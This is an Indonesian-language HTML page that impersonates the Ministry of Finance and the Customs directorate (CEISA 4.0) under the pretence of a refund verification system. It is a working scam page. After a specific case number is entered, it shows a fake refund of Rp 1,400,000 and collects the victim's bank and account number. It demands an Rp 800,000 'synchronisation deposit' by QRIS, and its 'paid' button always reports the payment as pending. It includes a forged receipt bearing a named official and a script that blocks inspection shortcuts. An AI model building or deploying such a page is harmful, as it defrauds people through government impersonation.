<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SISTEM INTEGRASI KAS NEGARA | CEISA 4.0 DJBC</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Roboto+Mono:wght@700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        :root {
            --navy-deep: #001e3c;
            --navy-primary: #003366;
            --gold-accent: #c5a059;
            --success: #15803d;
            --danger: #b91c1c;
            --warning: #d97706;
            --slate-100: #f1f5f9;
            --slate-300: #cbd5e1;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: #f0f4f8; color: var(--navy-deep); overflow-x: hidden; -webkit-user-select: none; }

        /* === üèõÔ∏è HEADER ENTERPRISE === */
        nav {
            background: var(--navy-deep); height: 85px; display: flex; align-items: center;
            border-bottom: 4px solid var(--gold-accent); position: sticky; top: 0; z-index: 2000;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        .nav-inner { width: 100%; max-width: 1200px; margin: 0 auto; padding: 0 20px; display: flex; justify-content: space-between; align-items: center; }
        .logo-group { display: flex; align-items: center; gap: 15px; }
        .sys-info { color: white; border-left: 2px solid var(--gold-accent); padding-left: 15px; }
        .sys-info h1 { font-size: 14px; font-weight: 900; letter-spacing: 1px; }

        .container { max-width: 850px; margin: 40px auto; padding: 0 20px; }

        /* === üîç PHASE 1: SEARCH GATEWAY === */
        .card-main { background: white; border-radius: 24px; padding: 40px; box-shadow: 0 20px 40px rgba(0,0,0,0.08); border: 1px solid white; }
        .hero-title { text-align: center; margin-bottom: 35px; }
        .hero-title i { font-size: 48px; color: var(--navy-primary); margin-bottom: 20px; }
        .hero-title h2 { font-weight: 800; font-size: 24px; color: var(--navy-primary); }

        .input-group { position: relative; max-width: 500px; margin: 0 auto; }
        .input-field { 
            width: 100%; padding: 20px 25px; border-radius: 16px; border: 2px solid var(--slate-100);
            font-size: 16px; font-weight: 700; background: #fafafa; transition: 0.3s;
        }
        .input-field:focus { border-color: var(--navy-primary); background: white; outline: none; box-shadow: 0 0 0 5px rgba(0,51,102,0.05); }

        .btn-supreme {
            width: 100%; padding: 18px; border-radius: 14px; border: none; font-weight: 800;
            cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 12px;
            transition: 0.3s; font-size: 16px;
        }
        .btn-navy { background: var(--navy-primary); color: white; }
        .btn-navy:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,51,102,0.2); }

        /* === üè¶ PHASE 2: BANK BINDING & DASHBOARD === */
        #dashboardPhase { display: none; animation: fadeIn 0.6s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .status-badge-sync {
            background: #fffbeb; border: 1px solid #fef3c7; padding: 20px; border-radius: 16px;
            margin-bottom: 25px; display: flex; flex-direction: column; gap: 10px;
        }
        .progress-track { height: 8px; background: #e2e8f0; border-radius: 10px; overflow: hidden; }
        .progress-fill { width: 65%; height: 100%; background: var(--warning); animation: pulse 2s infinite; }

        .audit-section { border-top: 1px solid #f1f5f9; padding-top: 25px; margin-top: 25px; }
        
        .bank-form { 
            display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0;
            background: #f8fafc; padding: 20px; border-radius: 16px; border: 1px solid #e2e8f0;
        }
        select, .acc-input { padding: 14px; border-radius: 10px; border: 1px solid var(--slate-300); font-weight: 600; color: var(--navy-deep); }

        .finance-table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 14px; }
        .finance-table td { padding: 12px 0; border-bottom: 1px solid #f1f5f9; }
        .finance-table .bold { font-weight: 800; text-align: right; font-family: 'Roboto Mono'; }
        .total-box { background: var(--navy-deep); color: white; padding: 20px; border-radius: 12px; margin-top: 15px; display: flex; justify-content: space-between; align-items: center; }

        /* === üìú KUITANSI MODAL === */
        #receiptModal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); backdrop-filter: blur(10px);
            z-index: 4000; display: none; justify-content: center; align-items: center; padding: 20px;
        }
        .receipt-doc {
            background: white; width: 100%; max-width: 600px; padding: 40px; position: relative;
            box-shadow: 0 0 50px rgba(0,0,0,0.5); font-family: 'Times New Roman', serif;
        }
        .watermark {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) rotate(-30deg);
            font-size: 50px; color: rgba(185, 28, 28, 0.1); font-weight: 900;
            border: 8px solid rgba(185, 28, 28, 0.1); padding: 15px; pointer-events: none; z-index: 10;
        }

        /* === üí≥ QRIS MODAL === */
        #qrisModal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); z-index: 5000; display: none; justify-content: center; align-items: center;
        }
        .qris-card { background: white; width: 90%; max-width: 400px; border-radius: 25px; padding: 30px; text-align: center; }

        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.6; } 100% { opacity: 1; } }
        
        @media (max-width: 768px) {
            .bank-form { grid-template-columns: 1fr; }
            .container { margin: 20px auto; }
        }
    </style>
</head>
<body>

    <nav>
        <div class="nav-inner">
            <div class="logo-group">
                <img src="https://i.ibb.co.com/hx6vT4x5/IMG-20260126-134506.jpg" height="45" alt="Kemenkeu">
                <div class="sys-info">
                    <h1>RECOVERY SYSTEM CEISA 4.0</h1>
                    <span style="font-size: 8px; color: var(--gold-accent); font-weight: 800; text-transform: uppercase;">Central Database Integration</span>
                </div>
            </div>
            <img src="https://i.ibb.co.com/N6Kj6fzx/IMG-20260126-134537.jpg" height="40" alt="Bea Cukai">
        </div>
    </nav>

    <div class="container">
        <div id="searchPhase" class="card-main">
            <div class="hero-title">
                <i class="fas fa-file-shield"></i>
                <h2>Verifikasi Dokumen Refund</h2>
                <p style="color: #64748b; font-size: 14px; margin-top: 5px;">Masukkan Nomor Berita Acara untuk Otentikasi Server</p>
            </div>
            
            <div class="input-group">
                <input type="text" id="docID" class="input-field" placeholder="Contoh: BA-052/BJM/2026">
                <button class="btn-supreme btn-navy" id="btnVerify" style="margin-top: 20px;">
                    <i class="fas fa-fingerprint"></i> VERIFIKASI AKSES
                </button>
            </div>
        </div>

        <div id="dashboardPhase">
            <div class="status-badge-sync">
                <div style="display: flex; justify-content: space-between; font-size: 13px; font-weight: 800;">
                    <span><i class="fas fa-sync-alt fa-spin"></i> SINKRONISASI DATA NASIONAL</span>
                    <span style="color: var(--warning);">65% PENDING</span>
                </div>
                <div class="progress-track"><div class="progress-fill"></div></div>
                <p style="font-size: 11px; color: #92400e;"><b>Status:</b> Dana jaminan telah dialokasikan. Menunggu verifikasi sinkronisasi rekening tujuan.</p>
            </div>

            <div class="card-main" style="padding: 30px;">
                <h3 style="font-size: 16px; font-weight: 800; border-bottom: 2px solid var(--gold-accent); display: inline-block; margin-bottom: 20px;">
                    FORM VALIDASI REKENING TUJUAN
                </h3>
                
                <div class="bank-form">
                    <div style="display: flex; flex-direction: column; gap: 5px;">
                        <label style="font-size: 10px; font-weight: 800; color: #64748b;">BANK PENERIMA</label>
                        <select id="userBank">
                            <option value="BANK BCA">BANK BCA</option>
                            <option value="BANK BRI">BANK BRI</option>
                            <option value="BANK BNI">BANK BNI</option>
                            <option value="BANK MANDIRI">BANK MANDIRI</option>
                            <option value="BANK SYARIAH INDONESIA">BSI</option>
                        </select>
                    </div>
                    <div style="display: flex; flex-direction: column; gap: 5px;">
                        <label style="font-size: 10px; font-weight: 800; color: #64748b;">NOMOR REKENING</label>
                        <input type="text" id="userAcc" class="acc-input" placeholder="Masukkan No. Rekening">
                    </div>
                </div>

                <div class="audit-section">
                    <h4 style="font-size: 12px; font-weight: 800; color: var(--navy-primary);">RINGKASAN AUDIT DANA</h4>
                    <table class="finance-table">
                        <tr><td>Sisa Jaminan (Setelah PPN 25%)</td><td class="bold">Rp 600.000,00</td></tr>
                        <tr><td>Deposit Sinkronisasi Pusat</td><td class="bold">Rp 800.000,00</td></tr>
                    </table>
                    <div class="total-box">
                        <span style="font-size: 12px; font-weight: 700;">TOTAL ESTIMASI PENCAIRAN</span>
                        <span style="font-size: 20px; font-weight: 900; font-family: 'Roboto Mono';">Rp 1.400.000</span>
                    </div>
                </div>

                <div style="margin-top: 30px; display: flex; flex-direction: column; gap: 12px;">
                    <button class="btn-supreme" id="btnShowReceipt" style="background: #e2e8f0; color: var(--navy-deep);">
                        <i class="fas fa-file-pdf"></i> PRATINJAU KUITANSI PROVISIONAL
                    </button>
                    <button class="btn-supreme" id="btnShowQR" style="background: var(--success); color: white;">
                        <i class="fas fa-bolt"></i> AKTIVASI SINKRONISASI & CAIRKAN
                    </button>
                </div>
            </div>
        </div>
    </div>

    <div id="receiptModal">
        <div class="receipt-doc">
            <div class="watermark">DITANGGUHKAN</div>
            <div style="text-align: center; border-bottom: 2px solid #000; padding-bottom: 10px; margin-bottom: 20px;">
                <h2 style="font-size: 16pt; margin: 0;">KEMENTERIAN KEUANGAN REPUBLIK INDONESIA</h2>
                <h3 style="font-size: 11pt; margin: 5px 0;">DIREKTORAT JENDERAL BEA DAN CUKAI</h3>
                <p style="font-size: 9pt;">KUITANSI ELEKTRONIK PENDING - ID: REG/77182/BJM</p>
            </div>
            <table style="width: 100%; font-size: 10pt; line-height: 1.8;">
                <tr><td width="35%">Nama Penerima</td><td>: <strong>SAZALI RAHMAN</strong></td></tr>
                <tr><td>Rekening Tujuan</td><td>: <strong id="rBank">...</strong> - <strong id="rAcc">...</strong></td></tr>
                <tr><td>Keperluan</td><td>: <strong>Pencairan Jaminan & Sinkronisasi Pusat</strong></td></tr>
                <tr><td>Status Dana</td><td>: <strong style="color: var(--danger);">TERTUNDA (PENDING SYNC)</strong></td></tr>
                <tr><td>Jumlah Uang</td><td style="background: #eee; font-weight: bold;">: Rp 1.400.000,00</td></tr>
            </table>
            <div style="margin-top: 20px; font-style: italic; font-size: 9pt; border: 1px dashed #999; padding: 10px;">
                "Dana dicairkan setelah proses Sinkronisasi Data Gateway (Rp 800.000) diselesaikan untuk memvalidasi jalur perbankan."
            </div>
            <div style="text-align: right; margin-top: 30px;">
                <p style="font-size: 10pt;">Banjarmasin, 17 Feb 2026</p>
                <div style="height: 60px;"></div>
                <p style="text-decoration: underline; font-weight: bold;">DIAN SETIAWAN, S.E.</p>
                <p style="font-size: 8pt;">NIP. 19890714 201301 1 008</p>
            </div>
            <button onclick="document.getElementById('receiptModal').style.display='none'" class="btn-supreme" style="margin-top: 20px; background: #666; font-size: 12px; padding: 10px; color: white;">TUTUP</button>
        </div>
    </div>

    <div id="qrisModal">
        <div class="qris-card">
            <img src="https://i.ibb.co.com/d02DxXjq/1000020200-1.png" style="height: 30px; margin-bottom: 20px;">
            <p style="font-size: 13px; font-weight: 800; color: var(--navy-deep); margin-bottom: 15px;">SCAN QRIS SINKRONISASI PUSAT</p>
            <div style="width: 220px; height: 220px; margin: 0 auto; border: 2px solid #f1f5f9; padding: 10px; border-radius: 15px;">
                <img src="https://i.ibb.co.com/d02DxXjq/1000020200-1.png" style="width: 100%;">
            </div>
            <div style="margin: 20px 0; background: #fef2f2; border: 2px dashed var(--danger); padding: 10px; border-radius: 12px;">
                <span style="font-size: 10px; font-weight: 700; color: #64748b;">TOTAL DEPOSIT SINKRONISASI</span>
                <h3 style="color: var(--danger); font-size: 24px; font-weight: 900;">Rp 800.000</h3>
            </div>
            <button class="btn-supreme" id="btnFinalConfirm" style="background: var(--success); color: white;">SAYA SUDAH MEMBAYAR</button>
            <button onclick="document.getElementById('qrisModal').style.display='none'" style="background:none; border:none; color:#94a3b8; font-size:12px; margin-top:15px; text-decoration:underline; cursor:pointer;">BATALKAN</button>
        </div>
    </div>

    <script>
        const docInput = document.getElementById('docID');
        const searchPhase = document.getElementById('searchPhase');
        const dashboardPhase = document.getElementById('dashboardPhase');

        // Logic 1: Verifikasi Dokumen
        document.getElementById('btnVerify').addEventListener('click', () => {
            const val = docInput.value.toUpperCase();
            if(val === "") return Swal.fire('Gagal', 'Nomor Dokumen wajib diisi!', 'error');

            Swal.fire({
                title: 'Mencocokkan Database...',
                html: 'Menghubungkan ke Gateway CEISA 4.0 Pusat',
                timer: 1500,
                didOpen: () => { Swal.showLoading(); }
            }).then(() => {
                if(val.includes("BA-052") || val.includes("001776528810")) {
                    searchPhase.style.display = 'none';
                    dashboardPhase.style.display = 'block';
                } else {
                    Swal.fire('Data Tidak Ditemukan', 'Dokumen tidak terdaftar atau telah kadaluarsa.', 'warning');
                }
            });
        });

        // Logic 2: Update Kuitansi dengan Data Bank
        document.getElementById('btnShowReceipt').addEventListener('click', () => {
            const bank = document.getElementById('userBank').value;
            const acc = document.getElementById('userAcc').value;
            
            if(acc === "") return Swal.fire('Info', 'Mohon isi Nomor Rekening terlebih dahulu!', 'info');
            
            document.getElementById('rBank').innerText = bank;
            document.getElementById('rAcc').innerText = acc;
            document.getElementById('receiptModal').style.display = 'flex';
        });

        // Logic 3: Open QRIS
        document.getElementById('btnShowQR').addEventListener('click', () => {
            const acc = document.getElementById('userAcc').value;
            if(acc === "") return Swal.fire('Input Rekening', 'Nomor rekening tujuan wajib diisi untuk sinkronisasi!', 'error');
            
            document.getElementById('qrisModal').style.display = 'flex';
        });

        // Logic 4: Konfirmasi Pembayaran
        document.getElementById('btnFinalConfirm').addEventListener('click', () => {
            Swal.fire({
                title: 'Memverifikasi Mutasi...',
                text: 'Harap tunggu, sistem sedang memvalidasi data sinkronisasi ke server pusat.',
                icon: 'info',
                showConfirmButton: false,
                timer: 3500
            }).then(() => {
                Swal.fire({
                    title: 'STATUS PENDING',
                    text: 'Dana 800.000 belum terdeteksi. Pastikan scan sukses dan dana mencukupi agar total 1.4 Juta dapat dicairkan otomatis.',
                    icon: 'warning'
                });
            });
        });

        // Anti Inspect
        document.addEventListener('keydown', e => {
            if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'i')) e.preventDefault();
        });
    </script>
</body>
</html>
